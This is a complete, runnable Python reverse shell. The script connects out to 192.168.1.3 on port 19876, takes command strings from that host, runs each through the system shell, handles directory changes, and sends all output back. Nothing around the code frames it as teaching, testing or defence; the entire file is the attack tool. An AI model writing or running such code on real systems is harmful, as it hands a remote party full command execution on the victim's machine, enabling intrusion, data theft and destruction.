import os
import socket
import subprocess
import sys

def receiver(s):
    while True:
        cmd_bytes = s.recv(4096)
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"$: ")

def connect(address):
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect(address)
    except socket.error:
        sys.exit()
    receiver(s)

if __name__ == "__main__":
    host = "192.168.1.3"
    port = 19876
    connect((host, port))
